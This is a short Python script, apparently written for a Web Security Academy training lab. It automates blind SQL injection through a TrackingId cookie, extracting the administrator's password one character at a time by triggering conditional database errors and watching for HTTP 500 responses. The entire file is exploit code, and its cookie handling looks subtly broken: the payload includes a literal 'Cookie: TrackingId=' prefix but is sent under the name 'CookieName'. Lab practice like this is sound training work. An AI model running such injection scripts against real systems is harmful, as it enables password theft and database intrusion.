import requests

# Create wordlists to iterate through
list_a = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
list_b = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

# URL creation
url = "https://0a9600b004f6f6bc80e4f30f0020000e.web-security-academy.com/something"
cookie_1 = "Cookie: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,"
cookie_2 = ",1)='"
cookie_3 = "' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"

# Loopy
for item_a in list_a:
    for item_b in list_b:
        # Convert items to strings
        str_item_a = str(item_a)
        str_item_b = str(item_b)

        cookie = cookie_1 + str_item_a + cookie_2 + str_item_b + cookie_3
        # Make the GET request with cookie parameter as a dictionary
        response = requests.get(url, cookies={'CookieName': cookie})
        # Check if the request was 500 (status code 500)
        if response.status_code == 500:
            print(str_item_b)
